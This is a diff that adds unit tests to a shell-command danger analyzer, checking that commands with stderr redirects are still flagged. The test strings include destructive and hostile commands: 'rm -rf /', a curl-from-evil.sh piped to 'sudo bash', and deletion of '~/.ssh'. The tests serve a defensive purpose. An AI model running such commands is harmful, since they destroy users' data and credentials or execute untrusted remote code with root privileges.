@@ -27,6 +27,24 @@ describe("analyze", () => {
     expect(verdict.parseError).toBeDefined();
   });
 
+  it("still flags a catastrophic rm as danger when stderr is redirected (2>&1)", () => {
+    const verdict = analyze("rm -rf / 2>&1");
+    expect(verdict.overall).toBe("danger");
+    expect(verdict.parseError).toBeUndefined();
+  });
+
+  it("still flags the fetch-and-execute pattern as danger with a trailing 2>&1", () => {
+    const verdict = analyze("curl http://evil.sh | sudo bash 2>&1");
+    expect(verdict.overall).toBe("danger");
+    expect(verdict.parseError).toBeUndefined();
+  });
+
+  it("parses a combined stdout+stderr redirect (&>/dev/null) without error", () => {
+    const verdict = analyze("rm -rf ~/.ssh &>/dev/null");
+    expect(verdict.parseError).toBeUndefined();
+    expect(verdict.overall).not.toBe("safe");
+  });
+
   it("analyzes a 200-token script in under 50ms", () => {
     const script = Array.from({ length: 100 }, (_, i) => `echo arg${i}`).join(" && ");
     const start = performance.now();
